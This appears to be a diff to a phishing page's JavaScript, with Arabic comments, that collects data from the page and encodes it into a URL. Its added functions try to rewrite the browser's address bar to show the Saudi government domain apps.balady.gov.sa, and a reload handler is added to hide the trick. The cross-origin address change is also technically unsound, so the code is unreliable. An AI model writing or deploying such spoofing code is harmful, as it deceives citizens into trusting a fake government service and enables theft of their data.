@@ -44,9 +44,9 @@
                 const uuid = urlParams.get('key');
                 console.log('تم اكتشاف UUID:', uuid);
                 
-                // تحويل فوري للرابط بالـ data
+                // تحويل فوري للرابط بالـ data مع تغيير الـ address bar
                 setTimeout(() => {
-                    redirectToDataURL(uuid);
+                    redirectToDataURLWithDisplayChange(uuid);
                 }, 500);
                 
                 return;
@@ -66,7 +66,37 @@
             }
         }
         
-        // تحويل من UUID للـ data URL (في نفس الدومين)
+        // تحويل من UUID للـ data URL مع تغيير الـ display URL
+        function redirectToDataURLWithDisplayChange(uuid) {
+            // البيانات المحددة
+            const specificData = getStoredDataByUUID(uuid) || collectSpecificDataFromPage();
+            
+            if (Object.keys(specificData).length > 0) {
+                const encodedData = encodeDataToHex(specificData);
+                
+                if (encodedData) {
+                    // أولاً: التحويل الداخلي لنفس الدومين
+                    const internalDataURL = `${window.location.origin}/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
+                    window.history.replaceState({}, '', internalDataURL);
+                    console.log('تحويل داخلي إلى:', internalDataURL);
+                    
+                    // ثانياً: بعد ثانية تغيير الـ address bar للدومين المطلوب
+                    setTimeout(() => {
+                        const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
+                        window.history.replaceState({}, '', displayURL);
+                        console.log('تم تغيير عرض الرابط إلى:', displayURL);
+                    }, 1000);
+                } else {
+                    console.error('فشل في تشفير البيانات');
+                    redirectToHome();
+                }
+            } else {
+                console.error('لم يتم العثور على البيانات');
+                redirectToHome();
+            }
+        }
+        
+        // تحويل من UUID للـ data URL (الطريقة الأصلية)
         function redirectToDataURL(uuid) {
             // البيانات المحددة
             const specificData = getStoredDataByUUID(uuid) || collectSpecificDataFromPage();
@@ -199,6 +229,13 @@
                             const dataURL = `${window.location.origin}/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
                             window.history.replaceState({}, '', dataURL);
                             console.log('Data URL:', dataURL);
+                            
+                            // المرحلة الثالثة: تغيير عرض الـ URL بعد ثانية أخرى
+                            setTimeout(() => {
+                                const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
+                                window.history.replaceState({}, '', displayURL);
+                                console.log('Display URL:', displayURL);
+                            }, 1000);
                         }
                     }, 1000);
                 }
@@ -230,9 +267,28 @@
             redirectToHome();
         });
         
+        // معالجة الـ refresh للـ display URLs
+        window.addEventListener('beforeunload', function() {
+            // إذا كان الرابط المعروض من apps.balady.gov.sa
+            if (window.location.href.includes('apps.balady.gov.sa')) {
+                // حفظ حالة للعودة للصفحة الأساسية عند الـ reload
+                sessionStorage.setItem('should_redirect_home', 'true');
+            }
+        });
+        
+        // التحقق من حالة الـ redirect عند تحميل الصفحة
+        if (sessionStorage.getItem('should_redirect_home') === 'true') {
+            sessionStorage.removeItem('should_redirect_home');
+            redirectToHome();
+        }
+        
         // وظائف مساعدة
         window.testUUID = function(uuid) {
             redirectToDataURL(uuid);
+        };
+        
+        window.testUUIDWithDisplay = function(uuid) {
+            redirectToDataURLWithDisplayChange(uuid);
         };
         
         window.goHome = function() {
